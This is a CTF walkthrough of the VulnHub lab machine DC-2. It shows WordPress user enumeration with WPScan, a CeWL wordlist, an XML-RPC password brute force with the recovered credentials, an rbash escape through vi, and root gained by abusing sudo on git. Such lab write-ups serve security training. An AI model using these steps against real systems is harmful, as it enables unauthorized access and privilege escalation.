DC:2

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Wordpress user enumeration
[+] Password Generation with Cewl
[+] Wordpress bruteforce 
[+] export PATH and SHELL environment variables
[+] Privilge Escalation abusing SUDO rights - /usr/bin/git
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Nmap Scanning Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.110
Host is up (0.00026s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/
MAC Address: 08:00:27:5E:07:20 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.25 ms 192.168.56.110

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.93 seconds

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Due to the fact that nmap said that it could't redirect to http://dc-2/ we addede the host into /etc/hosts


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kal1
192.168.56.110	dc-2

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Browsing to http://dc-2 we are able to load the site
We retrive the following information from the site:
       

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Flag 1:
Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.
More passwords is always better, but sometimes you just can’t win them all.
Log in as one to see the next flag.
If you can’t find it, log in as another.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The site is a wordpress instance. In ordet to get the flag, we have to login into the application.

Exploiting Wordpress
#1 - Identifying users

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/dc-2# wpscan --url http://dc-2 --enumerate u
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.4.3
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n
[+] URL: http://dc-2/
[+] Started: Thu Oct  3 01:37:16 2019

Interesting Finding(s):

[+] http://dc-2/
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Detected By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |
 | [!] 11 vulnerabilities identified:
 |
 | [!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
 |     Fixed in: 4.7.11
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9100
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
 |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
 |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
 |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
 |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
 |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated File Delete
 |     Fixed in: 4.7.12
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9169
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Post Type Bypass
 |     Fixed in: 4.7.12
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9170
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
 |
 | [!] Title: WordPress <= 5.0 - PHP Object Injection via Meta Data
 |     Fixed in: 4.7.12
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9171
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.7.12
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9172
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
 |     Fixed in: 4.7.12
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9173
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
 |
 | [!] Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing
 |     Fixed in: 4.7.12
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9174
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
 |     Fixed in: 4.7.12
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9175
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a
 |
 | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
 |     Fixed in: 5.0.1
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9222
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943
 |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
 |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce
 |
 | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)
 |     Fixed in: 4.7.13
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9230
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787
 |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b
 |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/
 |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 4.7.14
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9867
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2019-05-07T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Detected By: Css Style (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Detected By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating Users
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Detected By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] jerry
 | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Finished: Thu Oct  3 01:37:17 2019
[+] Requests Done: 4
[+] Cached Requests: 52
[+] Data Sent: 1.007 KB
[+] Data Received: 10.77 KB
[+] Memory used: 724 KB
[+] Elapsed time: 00:00:01

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Users discovered: tom, jerry, admin

Creating a password file from the website with cewl.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# cewl -d 2 -m 5 -w docswords.txt http://dc-2
CeWL 5.4.3 (Arkanoid) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
root@setrus:~# cat docswords.txt 
vitae
luctus
content
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Trying to bruteforce user tom, jerry and admin

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/dc-2# wpscan --url http://dc-2 --passwords docswords.txt -U tom
... snip...
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - tom / parturient      


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Loggin in with user tom :  parturient


   


Bruteforce user jerry

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

root@setrus:~# wpscan --url http://dc-2 --passwords docswords.txt -U jerry

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - jerry / adipiscing       
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Looking through the pages of the site we found Flag2
Flag 2:
If you can't exploit WordPress and take a shortcut, there is another way.
Hope you found another entry point.

Looking for another open port we found :  7744.
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# telnet 192.168.56.110 7744
Trying 192.168.56.110...
Connected to 192.168.56.110.
Escape character is '^]'.
SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u7

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Connecting through ssh

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh tom@192.168.56.110 -p 7744
tom@192.168.56.110's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Oct  3 02:04:52 2019 from 192.168.56.102
tom@DC-2:~$ id
-rbash: id: command not found
tom@DC-2:~$ echo $PATH
/home/tom/usr/bin
tom@DC-2:~$ echo /home/tom/usr/bin/*
/home/tom/usr/bin/less /home/tom/usr/bin/ls /home/tom/usr/bin/scp /home/tom/usr/bin/vi

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Escaping restricted shell with vi. Normal vi :  :!/bin/bash is not working.
Aflter looking at vi escape restricted shell at : https://gtfobins.github.io/#+shell

vi
:shell=/bin/bash
:shell

We are able to get a bash shell with restrictions.
Exporting SHELL , PATH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
tom@DC-2:~$ id
bash: id: command not found
tom@DC-2:~$ export SHELL=/bin/bash:$SHELL
tom@DC-2:~$ export PATH=/usr/bin:$PATH
tom@DC-2:~$ export PATH=/bin:$PATH
tom@DC-2:~$ cat flag3.txt
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Connecting as jerry

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
tom@DC-2:~$ su jerry
Password: 
jerry@DC-2:/home/tom$ id
uid=1002(jerry) gid=1002(jerry) groups=1002(jerry)
jerry@DC-2:/home/tom$ 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Jerry has sudo -l privileges on (root) NOPASSWD: /usr/bin/git

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
jerry@DC-2:/home/tom$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege escalation with git
run git help config
!/bin/bash


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
jerry@DC-2:/home/tom$ sudo /usr/bin/git help config
root@DC-2:/home/tom# id
uid=0(root) gid=0(root) groups=0(root)


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Flag4

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@DC-2:/home/jerry# cat flag4.txt
Good to see that you've made it this far - but you're not home yet. 

You still need to get the final flag (the only flag that really counts!!!).  

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Final-Flag

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@DC-2:~# cat final-flag.txt 
 __    __     _ _       _                    _ 
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ 
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



